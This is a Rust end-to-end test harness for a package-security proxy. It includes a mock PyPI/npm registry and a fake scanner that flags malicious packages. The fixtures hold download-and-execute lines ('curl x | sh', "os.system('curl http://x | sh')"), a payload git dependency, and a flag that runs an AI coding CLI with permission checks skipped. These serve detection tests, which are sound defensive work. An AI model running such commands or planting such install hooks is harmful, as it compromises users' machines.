//! End-to-end tests: the real server against a local mock registry, with a stand-in
//! scanner (the real one lives in `customs-scan`) and the untrained dev models.
//!
//! This file holds the mock registry and the harness; the tests are in one module per
//! surface. They share one test binary, so the support code is compiled once.

use std::collections::{BTreeMap, HashMap};
use std::path::PathBuf;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use axum::extract::{Path, State};
use axum::http::StatusCode;
use axum::response::{IntoResponse, Response};
use axum::routing::get;
use axum::{Json, Router};
use chrono::Utc;
use customs::config::{Mode, Policy, RuleSeverity};
use customs::engine::{Engine, EngineConfig, Limits, ScanFn};
use customs::metrics::Metrics;
use customs::server::ServeOptions;
use customs_model::Models;
use customs_scan::{Ecosystem, Evidence, ScanReport};
use serde_json::{json, Value};
use tokio::net::TcpListener;

mod api;
mod audit;
mod cli;
mod hook;
mod mcp;
mod proxy;

// ------------------------------------------------------------------ mock registry

#[derive(Default)]
struct MockState {
    base: String,
    hits: Mutex<HashMap<String, usize>>,
    /// When set, archive downloads wait for a permit (one per download).
    file_gate: Mutex<Option<Arc<tokio::sync::Semaphore>>>,
    /// Files added while a test runs.
    extra_pypi: Mutex<Vec<ExtraFile>>,
    extra_npm: Mutex<Vec<ExtraFile>>,
}

/// A file a test adds to the mock registry after it started. An npm file of a listed
/// version must be named `{bare}-{version}.tgz`, the name the packument's tarball URL
/// gives it.
#[derive(Clone)]
struct ExtraFile {
    name: String,
    version: String,
    filename: String,
    bytes: Vec<u8>,
    /// Upload (PyPI) or publish (npm) time.
    time: String,
    /// npm: extra version document fields.
    doc: Value,
    /// Whether the registry metadata lists it (the archive is served either way).
    listed: bool,
}

impl ExtraFile {
    fn new(name: &str, version: &str, filename: &str, bytes: &[u8], time: String) -> Self {
        Self {
            name: name.into(),
            version: version.into(),
            filename: filename.into(),
            bytes: bytes.to_vec(),
            time,
            doc: json!({}),
            listed: true,
        }
    }
}

impl MockState {
    fn hit(&self, key: &str) {
        *self
            .hits
            .lock()
            .unwrap()
            .entry(key.to_string())
            .or_default() += 1;
    }
    fn hits(&self, key: &str) -> usize {
        self.hits.lock().unwrap().get(key).copied().unwrap_or(0)
    }
}

type Mock = Arc<MockState>;

/// Packages the mock knows: (name, version, archive bytes, upload time).
fn pypi_packages() -> Vec<(&'static str, &'static str, &'static [u8], String)> {
    let old = "2020-01-01T00:00:00.000000Z".to_string();
    let fresh = (Utc::now() - chrono::Duration::hours(2)).to_rfc3339();
    vec![
        ("goodpkg", "1.0.0", b"benign archive", old.clone()),
        ("goodpkg", "1.1.0", b"benign archive v1.1", old.clone()),
        ("evilpkg", "0.0.1", b"EVIL archive", old.clone()),
        ("reqeusts", "2.0.0", b"benign typosquat", old.clone()),
        ("slowpkg", "1.0.0", b"benign slow", old.clone()),
        ("newpkg", "1.0.0", b"benign but new", fresh),
        // The stand-in scanner reports a `setup.py` too large to read.
        ("paddedpkg", "1.0.0", b"benign but padded", old.clone()),
        // The stand-in scanner reports install-time code that runs an AI coding CLI with
        // its permission checks off.
        ("agentic", "1.0.0", b"benign but agentic", old.clone()),
        // A release after five quiet years.
        (
            "revived",
            "1.0.0",
            b"benign revived",
            "2015-01-01T00:00:00.000000Z".into(),
        ),
        // Inside the history rules' 90-day window.
        (
            "revived",
            "1.1.0",
            b"benign revived again",
            (Utc::now() - chrono::Duration::days(10)).to_rfc3339(),
        ),
        // An established project with a release from an hour ago.
        ("rolling", "1.0.0", b"benign rolling", old.clone()),
        (
            "rolling",
            "1.1.0",
            b"benign rolling 1.1.0",
            (Utc::now() - chrono::Duration::hours(1)).to_rfc3339(),
        ),
        // A popular name (in models/dev/popular_pypi.txt) whose archives the dev model
        // flags: a release older than `established.min_age_days`, and one younger.
        (
            "six",
            "1.16.0",
            b"EVIL but established",
            (Utc::now() - chrono::Duration::days(200)).to_rfc3339(),
        ),
        (
            "six",
            "1.17.0",
            b"EVIL and recent",
            (Utc::now() - chrono::Duration::days(10)).to_rfc3339(),
        ),
        // 1.0.0 carries PEP 740 provenance in the JSON simple index, 1.1.0 does not.
        (
            "unsigned",
            "1.0.0",
            b"benign attested",
            (Utc::now() - chrono::Duration::days(100)).to_rfc3339(),
        ),
        (
            "unsigned",
            "1.1.0",
            b"benign unattested",
            (Utc::now() - chrono::Duration::days(10)).to_rfc3339(),
        ),
    ]
}

fn file_name(name: &str, version: &str) -> String {
    format!("{name}-{version}.tar.gz")
}

/// Files of the mock that carry a PEP 740 provenance object.
const ATTESTED: [(&str, &str); 1] = [("unsigned", "1.0.0")];

async fn simple_page(
    State(m): State<Mock>,
    Path(project): Path<String>,
    headers: axum::http::HeaderMap,
) -> Response {
    // Customs asks for exactly the JSON index when it reads provenance; the proxy's
    // pass-through requests (which list several types) keep getting HTML.
    if headers.get("accept").and_then(|a| a.to_str().ok())
        == Some("application/vnd.pypi.simple.v1+json")
    {
        let mut files: Vec<Value> = pypi_packages()
            .into_iter()
            .filter(|p| p.0 == project)
            .map(|(n, v, _, t)| {
                let prov = ATTESTED
                    .contains(&(n, v))
                    .then(|| format!("{}/integrity/{n}/{v}/provenance", m.base));
                json!({"filename": file_name(n, v), "upload-time": t, "provenance": prov})
            })
            .collect();
        for f in m.extra_pypi.lock().unwrap().iter() {
            if f.name == project && f.listed {
                files.push(json!({"filename": f.filename, "upload-time": f.time}));
            }
        }
        if files.is_empty() {
            return (StatusCode::NOT_FOUND, "Not Found").into_response();
        }
        return (
            [("content-type", "application/vnd.pypi.simple.v1+json")],
            json!({"meta": {"api-version": "1.1"}, "name": project, "files": files}).to_string(),
        )
            .into_response();
    }
    let mut names: Vec<String> = pypi_packages()
        .into_iter()
        .filter(|p| p.0 == project)
        .map(|(n, v, _, _)| file_name(n, v))
        .collect();
    for f in m.extra_pypi.lock().unwrap().iter() {
        if f.name == project && f.listed {
            names.push(f.filename.clone());
        }
    }
    let links: Vec<String> = names
        .iter()
        .map(|f| {
            format!(
                r#"<a href="{}/files/packages/ab/cd/{f}#sha256=00">{f}</a><br/>"#,
                m.base
            )
        })
        .collect();
    if links.is_empty() {
        return (StatusCode::NOT_FOUND, "Not Found").into_response();
    }
    (
        [("content-type", "text/html")],
        format!("<html><body>{}</body></html>", links.join("\n")),
    )
        .into_response()
}

fn pypi_file_json(m: &MockState, n: &str, v: &str, t: &str, bytes: &[u8]) -> Value {
    json!({
        "filename": file_name(n, v),
        "url": format!("{}/files/packages/ab/cd/{}", m.base, file_name(n, v)),
        "upload_time_iso_8601": t,
        "packagetype": "sdist",
        "size": bytes.len(),
        "digests": {"sha256": "00"},
        "yanked": false,
    })
}

fn extra_pypi_file_json(m: &MockState, f: &ExtraFile) -> Value {
    json!({
        "filename": f.filename,
        "url": format!("{}/files/packages/ab/cd/{}", m.base, f.filename),
        "upload_time_iso_8601": f.time,
        "packagetype": if f.filename.ends_with(".whl") { "bdist_wheel" } else { "sdist" },
        "size": f.bytes.len(),
        "digests": {"sha256": "00"},
        "yanked": false,
    })
}

/// The releases of `name` as `(version, files)`, in the order they were added.
fn pypi_releases(m: &MockState, name: &str) -> Vec<(String, Vec<Value>)> {
    let mut out: Vec<(String, Vec<Value>)> = Vec::new();
    let mut add = |v: &str, f: Value| match out.iter_mut().find(|(x, _)| x == v) {
        Some((_, files)) => files.push(f),
        None => out.push((v.to_string(), vec![f])),
    };
    for (n, v, b, t) in pypi_packages().into_iter().filter(|p| p.0 == name) {
        add(v, pypi_file_json(m, n, v, &t, b));
    }
    for f in m.extra_pypi.lock().unwrap().iter() {
        if f.name == name && f.listed {
            add(&f.version, extra_pypi_file_json(m, f));
        }
    }
    out
}

async fn pypi_json(State(m): State<Mock>, Path(name): Path<String>) -> Response {
    let rels = pypi_releases(&m, &name);
    if rels.is_empty() {
        return (StatusCode::NOT_FOUND, Json(json!({"message": "Not Found"}))).into_response();
    }
    let latest = rels.last().unwrap().0.clone();
    let releases: serde_json::Map<String, Value> =
        rels.into_iter().map(|(v, f)| (v, json!(f))).collect();
    Json(json!({"info": {"name": name, "version": latest}, "releases": releases})).into_response()
}

async fn pypi_version_json(
    State(m): State<Mock>,
    Path((name, version)): Path<(String, String)>,
) -> Response {
    match pypi_releases(&m, &name)
        .into_iter()
        .find(|(v, _)| *v == version)
    {
        Some((v, files)) => {
            Json(json!({"info": {"name": name, "version": v}, "urls": files})).into_response()
        }
        None => (StatusCode::NOT_FOUND, "{}").into_response(),
    }
}

/// Wait for the test to release one download, when it holds them back.
async fn pass_gate(m: &MockState) {
    let gate = m.file_gate.lock().unwrap().clone();
    if let Some(g) = gate {
        g.acquire().await.unwrap().forget();
    }
}

async fn files(State(m): State<Mock>, Path(path): Path<String>) -> Response {
    m.hit(&path);
    pass_gate(&m).await;
    let file = path.rsplit('/').next().unwrap_or("");
    for (n, v, b, _) in pypi_packages() {
        if file_name(n, v) == file {
            return b.to_vec().into_response();
        }
    }
    if let Some(f) = m
        .extra_pypi
        .lock()
        .unwrap()
        .iter()
        .find(|f| f.filename == file)
    {
        return f.bytes.clone().into_response();
    }
    StatusCode::NOT_FOUND.into_response()
}

/// npm packages: (name, version, bytes, published, extra version document fields).
fn npm_packages() -> Vec<(&'static str, &'static str, &'static [u8], String, Value)> {
    let old = "2019-05-01T00:00:00.000Z".to_string();
    let fresh = (Utc::now() - chrono::Duration::hours(1)).to_rfc3339();
    // Inside the history rules' 90-day window.
    let recent = chrono::DateTime::from_timestamp(Utc::now().timestamp() - 10 * 86_400, 0).unwrap();
    let attested = json!({"attestations": {"url": "https://r/attestations/x", "provenance": {}}});
    vec![
        (
            "@scope/lib",
            "1.2.3",
            b"benign scoped",
            old.clone(),
            json!({}),
        ),
        (
            "plainlib",
            "0.1.0",
            b"benign plain",
            old.clone(),
            json!({"scripts": {"test": "jest"}}),
        ),
        (
            "freshpkg",
            "1.0.0",
            b"benign fresh",
            fresh,
            json!({"scripts": {"postinstall": "node setup.js"}}),
        ),
        (
            "evil-js",
            "6.6.6",
            b"EVIL js",
            old.clone(),
            json!({"scripts": {"preinstall": "curl x | sh"}}),
        ),
        // An established package with a release from an hour ago.
        (
            "rolling-js",
            "1.0.0",
            b"benign rolling-js",
            old.clone(),
            json!({}),
        ),
        (
            "rolling-js",
            "1.1.0",
            b"benign rolling-js 1.1.0",
            (Utc::now() - chrono::Duration::hours(1)).to_rfc3339(),
            json!({}),
        ),
        // An established package whose latest release looks like an account takeover.
        (
            "hijacked",
            "1.0.0",
            b"benign hijacked",
            old,
            json!({"_npmUser": {"name": "maintainer"}, "dist": attested}),
        ),
        (
            "hijacked",
            "1.1.0",
            b"benign hijacked 1.1.0",
            "2019-06-01T00:00:00.000Z".into(),
            json!({"_npmUser": {"name": "maintainer"}, "dist": attested}),
        ),
        (
            "hijacked",
            "1.1.1",
            b"benign hijacked 1.1.1",
            (Utc::now() - chrono::Duration::days(10)).to_rfc3339(),
            json!({"_npmUser": {"name": "attacker"}, "scripts": {"postinstall": "node bundle.js"}}),
        ),
        // A takeover that hides its payload in dependencies: a brand-new package from a
        // stranger and a git dependency npm would fetch without asking the registry.
        (
            "depjack",
            "2.0.0",
            b"benign depjack",
            "2023-12-01T00:00:00.000Z".into(),
            json!({"_npmUser": {"name": "maintainer"}, "dependencies": {"plainlib": "^0.1.0"}}),
        ),
        (
            "depjack",
            "2.0.1",
            b"benign depjack 2.0.1",
            recent.to_rfc3339(),
            json!({"_npmUser": {"name": "maintainer"}, "dependencies":
                {"plainlib": "^0.1.0", "lure-dep": "^0.0.1"},
                "optionalDependencies": {"@depjack/setup": "github:evil/payload#abc"}}),
        ),
        (
            "lure-dep",
            "0.0.1",
            b"benign lure",
            (recent - chrono::Duration::days(1)).to_rfc3339(),
            json!({"_npmUser": {"name": "stranger"}}),
        ),
        // Real tarballs, for `customs diff`: the second release adds a dependency, an
        // install script and the file it runs.
        (
            "diffpkg",
            "1.0.0",
            &diffpkg_tarballs().0,
            "2023-01-01T00:00:00.000Z".into(),
            json!({"_npmUser": {"name": "maintainer"}, "dependencies": {"plainlib": "^0.1.0"}}),
        ),
        (
            "diffpkg",
            "1.0.1",
            &diffpkg_tarballs().1,
            "2024-01-01T00:00:00.000Z".into(),
            json!({"_npmUser": {"name": "maintainer"},
                "dependencies": {"plainlib": "^0.1.0", "lure-dep": "^0.0.1"},
                "scripts": {"postinstall": "node setup.js"}}),
        ),
    ]
}

fn diffpkg_tarballs() -> &'static (Vec<u8>, Vec<u8>) {
    static T: std::sync::OnceLock<(Vec<u8>, Vec<u8>)> = std::sync::OnceLock::new();
    T.get_or_init(|| {
        (
            npm_tgz(&[
                ("package/package.json", r#"{"name": "diffpkg", "version": "1.0.0"}"#),
                ("package/index.js", "const a = 1;\nmodule.exports = a;\n"),
                ("package/README.md", "docs\n"),
                ("package/old.js", "legacy();\n"),
            ]),
            npm_tgz(&[
                (
                    "package/package.json",
                    r#"{"name": "diffpkg", "version": "1.0.1", "scripts": {"postinstall": "node setup.js"}}"#,
                ),
                ("package/index.js", "const a = 2;\nmodule.exports = a;\n"),
                ("package/README.md", "docs\n"),
                ("package/setup.js", "// EVIL\nfetchAndRun();\n"),
            ]),
        )
    })
}

/// Echoes the query, so a test can see what reached the registry.
async fn npm_search(uri: axum::http::Uri) -> Response {
    Json(json!({"objects": [], "query": uri.query()})).into_response()
}

async fn npm_doc(State(m): State<Mock>, Path(rest): Path<String>) -> Response {
    if let Some((name, file)) = rest.split_once("/-/") {
        m.hit(&format!("npm:{file}"));
        pass_gate(&m).await;
        for (n, v, b, _, _) in npm_packages() {
            let bare = n.rsplit('/').next().unwrap();
            if n == name && file == format!("{bare}-{v}.tgz") {
                return b.to_vec().into_response();
            }
        }
        if let Some(f) = m
            .extra_npm
            .lock()
            .unwrap()
            .iter()
            .find(|f| f.name == name && f.filename == file)
        {
            return f.bytes.clone().into_response();
        }
        return StatusCode::NOT_FOUND.into_response();
    }
    let name = rest.replace("%2f", "/").replace("%2F", "/");
    let mut rows: Vec<(String, String, String, Value)> = npm_packages()
        .into_iter()
        .filter(|p| p.0 == name)
        .map(|(n, v, _, t, extra)| (n.to_string(), v.to_string(), t, extra))
        .collect();
    for f in m.extra_npm.lock().unwrap().iter() {
        if f.name == name && f.listed {
            rows.push((
                f.name.clone(),
                f.version.clone(),
                f.time.clone(),
                f.doc.clone(),
            ));
        }
    }
    if rows.is_empty() {
        return (StatusCode::NOT_FOUND, Json(json!({"error": "Not found"}))).into_response();
    }
    let mut time = serde_json::Map::new();
    let mut versions = serde_json::Map::new();
    for (n, v, t, extra) in &rows {
        let bare = n.rsplit('/').next().unwrap();
        let mut doc = extra.clone();
        doc["name"] = json!(n);
        doc["version"] = json!(v);
        if doc.get("dist").is_none() {
            doc["dist"] = json!({});
        }
        doc["dist"]["tarball"] = json!(format!("{}/npm/{n}/-/{bare}-{v}.tgz", m.base));
        doc["dist"]["shasum"] = json!("x");
        time.insert(v.to_string(), json!(t));
        versions.insert(v.to_string(), doc);
    }
    time.insert("created".into(), json!(rows[0].2));
    Json(json!({
        "name": name,
        "dist-tags": {"latest": rows.last().unwrap().1},
        "time": time,
        "versions": versions,
    }))
    .into_response()
}

async fn start_mock() -> Mock {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let state = Arc::new(MockState {
        base,
        ..Default::default()
    });
    let app = Router::new()
        .route("/simple/{project}/", get(simple_page))
        .route("/pypi/{name}/json", get(pypi_json))
        .route("/pypi/{name}/{version}/json", get(pypi_version_json))
        .route("/files/{*path}", get(files))
        .route("/npm/-/v1/search", get(npm_search))
        .route("/npm/{*rest}", get(npm_doc))
        .with_state(state.clone());
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    state
}

// ------------------------------------------------------------------ harness

/// Stand-in scanner: archives containing `EVIL` light up the install-time indicators the
/// dev tree model keys on; everything else gets benign zero features.
fn fake_scanner(calls: Arc<AtomicUsize>) -> ScanFn {
    Arc::new(move |bytes: &[u8], filename: &str, eco: Ecosystem| {
        calls.fetch_add(1, Ordering::SeqCst);
        let mut plain = Vec::new();
        let bytes = if bytes.starts_with(&[0x1f, 0x8b]) {
            use std::io::Read;
            flate2::read::GzDecoder::new(bytes)
                .read_to_end(&mut plain)
                .unwrap();
            &plain[..]
        } else {
            bytes
        };
        let evil = bytes.windows(4).any(|w| w == b"EVIL");
        let mut features = BTreeMap::new();
        for f in [
            "inst_download_exec",
            "inst_exfil_endpoint",
            "inst_proc_exec",
            "inst_network",
        ] {
            features.insert(f.to_string(), if evil { 2.0 } else { 0.0 });
        }
        let mut install_surface = vec!["setup.py".to_string()];
        if bytes.ends_with(b"fresh") {
            install_surface.push("package.json:scripts.postinstall".into());
        }
        Ok(ScanReport {
            schema_version: 1,
            ecosystem: eco,
            archive: filename.to_string(),
            sha256: String::new(),
            name: None,
            version: None,
            features,
            evidence: if evil {
                vec![Evidence {
                    indicator: "download_exec".into(),
                    file: "setup.py".into(),
                    line: 3,
                    snippet: "os.system('curl http://x | sh')".into(),
                }]
            } else {
                vec![]
            },
            install_surface,
            tokens: None,
            errors: vec![],
            unread_code: if bytes.ends_with(b"padded") {
                vec!["setup.py".into()]
            } else {
                vec![]
            },
            startup_hooks: vec![],
            agent_bypass: if bytes.ends_with(b"agentic") {
                vec!["telemetry.js:4: --dangerously-skip-permissions".into()]
            } else {
                vec![]
            },
            hidden_code: vec![],
        })
    })
}

fn dev_models() -> Models {
    let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../models/dev");
    Models::load(dir).unwrap()
}

struct Harness {
    base: String,
    mock: Mock,
    engine: Arc<Engine>,
    scans: Arc<AtomicUsize>,
    http: reqwest::Client,
    shutdown: Option<tokio::sync::oneshot::Sender<()>>,
    server: Option<tokio::task::JoinHandle<anyhow::Result<()>>>,
    _dir: tempfile::TempDir,
}

impl Harness {
    async fn start(edit: impl FnOnce(&mut Policy)) -> Self {
        Self::start_with_ui(edit, None).await
    }

    async fn start_with_ui(edit: impl FnOnce(&mut Policy), ui: Option<PathBuf>) -> Self {
        Self::start_full(edit, ui, Limits::default()).await
    }

    async fn start_full(
        edit: impl FnOnce(&mut Policy),
        ui: Option<PathBuf>,
        limits: Limits,
    ) -> Self {
        Self::start_serving(edit, ui, limits, "127.0.0.1:0", ServeOptions::default()).await
    }

    async fn start_serving(
        edit: impl FnOnce(&mut Policy),
        ui: Option<PathBuf>,
        limits: Limits,
        bind: &str,
        opts: ServeOptions,
    ) -> Self {
        let mock = start_mock().await;
        let dir = tempfile::tempdir().unwrap();
        let mut policy = Policy::default();
        policy.upstream.pypi_simple = format!("{}/simple", mock.base);
        policy.upstream.pypi_files = format!("{}/files", mock.base);
        policy.upstream.pypi_json = format!("{}/pypi", mock.base);
        policy.upstream.npm = format!("{}/npm", mock.base);
        edit(&mut policy);
        let scans = Arc::new(AtomicUsize::new(0));
        let engine = Engine::new(EngineConfig {
            data_dir: dir.path().to_path_buf(),
            models: dev_models(),
            policy,
            policy_path: dir.path().join("policy.toml"),
            scanner: fake_scanner(scans.clone()),
            limits,
            metrics: Arc::new(Metrics::new()),
        })
        .unwrap();
        let listener = TcpListener::bind(bind).await.unwrap();
        let base = format!("http://127.0.0.1:{}", listener.local_addr().unwrap().port());
        let (tx, rx) = tokio::sync::oneshot::channel::<()>();
        let server = tokio::spawn(customs::server::serve_with(
            listener,
            engine.clone(),
            ui,
            opts,
            async move {
                let _ = rx.await;
            },
        ));
        Self {
            base,
            mock,
            engine,
            scans,
            http: reqwest::Client::builder().no_proxy().build().unwrap(),
            shutdown: Some(tx),
            server: Some(server),
            _dir: dir,
        }
    }

    async fn get(&self, path: &str) -> reqwest::Response {
        self.http
            .get(format!("{}{path}", self.base))
            .send()
            .await
            .unwrap()
    }

    async fn check(&self, eco: &str, name: &str, version: Option<&str>) -> (u16, Value) {
        let r = self
            .http
            .post(format!("{}/api/check", self.base))
            .json(&json!({"ecosystem": eco, "name": name, "version": version, "client": "test"}))
            .send()
            .await
            .unwrap();
        (r.status().as_u16(), r.json().await.unwrap())
    }

    async fn events(&self) -> Vec<Value> {
        self.get("/api/events").await.json().await.unwrap()
    }

    async fn stop(mut self) {
        let _ = self.shutdown.take().unwrap().send(());
        tokio::time::timeout(Duration::from_secs(10), self.server.take().unwrap())
            .await
            .expect("graceful shutdown timed out")
            .unwrap()
            .unwrap();
    }
}

fn pypi_file_path(name: &str, version: &str) -> String {
    format!("/pypi/files/packages/ab/cd/{}", file_name(name, version))
}

// Helpers several test modules use.

fn rules_of(v: &Value) -> Vec<String> {
    v["policy_hits"]
        .as_array()
        .unwrap()
        .iter()
        .map(|h| h.as_str_rule().to_string())
        .collect()
}

trait RuleName {
    fn as_str_rule(&self) -> &str;
}

impl RuleName for Value {
    fn as_str_rule(&self) -> &str {
        self["rule"].as_str().unwrap()
    }
}

/// Installer and proxy settings a spawned binary must not inherit from the developer.
const INHERITED_PREFIXES: [&str; 5] = ["CUSTOMS_", "PIP_", "UV_", "NPM_CONFIG_", "YARN_"];

const INHERITED_VARS: [&str; 5] = [
    "PIPENV_PYPI_MIRROR",
    "PDM_PYPI_URL",
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "ALL_PROXY",
];

/// The real binary, isolated from the machine it runs on: `data_dir` is its data directory,
/// whose `policy.toml` (unless the test wrote one) points every upstream at `registry` (the
/// mock) or at a closed port; it gets the dev models and none of the caller's `CUSTOMS_*`,
/// installer index or proxy variables. A check that misses the server and falls back to an
/// in-process engine therefore stays offline and writes only below `data_dir`.
fn customs_cmd(data_dir: &std::path::Path, registry: Option<&str>) -> std::process::Command {
    std::fs::create_dir_all(data_dir).unwrap();
    let policy = data_dir.join("policy.toml");
    if !policy.exists() {
        let b = registry.unwrap_or("http://127.0.0.1:9");
        std::fs::write(
            &policy,
            format!(
                "[upstream]\npypi_simple = \"{b}/simple\"\npypi_files = \"{b}/files\"\npypi_json = \"{b}/pypi\"\nnpm = \"{b}/npm\"\n"
            ),
        )
        .unwrap();
    }
    let mut c = std::process::Command::new(env!("CARGO_BIN_EXE_customs"));
    for (k, _) in std::env::vars_os() {
        let upper = k.to_string_lossy().to_ascii_uppercase();
        if INHERITED_PREFIXES.iter().any(|p| upper.starts_with(p))
            || INHERITED_VARS.contains(&upper.as_str())
        {
            c.env_remove(&k);
        }
    }
    c.env("CUSTOMS_DATA_DIR", data_dir).env(
        "CUSTOMS_MODELS",
        PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../models/dev"),
    );
    c
}

fn npm_tgz(files: &[(&str, &str)]) -> Vec<u8> {
    use std::io::Write;
    let mut b = tar::Builder::new(Vec::new());
    for (path, data) in files {
        let mut h = tar::Header::new_gnu();
        h.set_size(data.len() as u64);
        h.set_mode(0o644);
        h.set_entry_type(tar::EntryType::Regular);
        b.append_data(&mut h, path, data.as_bytes()).unwrap();
    }
    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    gz.write_all(&b.into_inner().unwrap()).unwrap();
    gz.finish().unwrap()
}

/// A loopback URL nothing listens on (a port that was just free).
fn dead_server() -> String {
    let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    format!("http://{}", l.local_addr().unwrap())
}

fn now_rfc3339() -> String {
    Utc::now().to_rfc3339()
}

fn hit<'a>(v: &'a Value, rule: &str) -> Option<&'a Value> {
    v["policy_hits"]
        .as_array()
        .unwrap()
        .iter()
        .find(|h| h["rule"] == rule)
}

/// Wait until `/metrics` contains `needle`, or fail after a generous deadline.
async fn wait_for_metric(h: &Harness, needle: &str) {
    let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
    loop {
        let m = h.get("/metrics").await.text().await.unwrap();
        if m.contains(needle) {
            return;
        }
        assert!(
            tokio::time::Instant::now() < deadline,
            "no `{needle}` in /metrics:\n{m}"
        );
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
}

/// Hold every mock file download until the test releases it.
fn hold_downloads(h: &Harness) -> Arc<tokio::sync::Semaphore> {
    let gate = Arc::new(tokio::sync::Semaphore::new(0));
    *h.mock.file_gate.lock().unwrap() = Some(gate.clone());
    gate
}

/// A `tracing` writer that keeps everything written to it.
#[derive(Clone, Default)]
struct LogBuf(Arc<Mutex<Vec<u8>>>);

impl std::io::Write for LogBuf {
    fn write(&mut self, b: &[u8]) -> std::io::Result<usize> {
        self.0.lock().unwrap().extend_from_slice(b);
        Ok(b.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

impl LogBuf {
    fn text(&self) -> String {
        String::from_utf8_lossy(&self.0.lock().unwrap()).into_owned()
    }
}

impl<'a> tracing_subscriber::fmt::MakeWriter<'a> for LogBuf {
    type Writer = LogBuf;
    fn make_writer(&'a self) -> LogBuf {
        self.clone()
    }
}

/// A registry that answers every request with 200 and a body that is not JSON.
async fn start_garbage_registry() -> String {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let app = Router::new().fallback(|| async { (StatusCode::OK, "not json") });
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    base
}
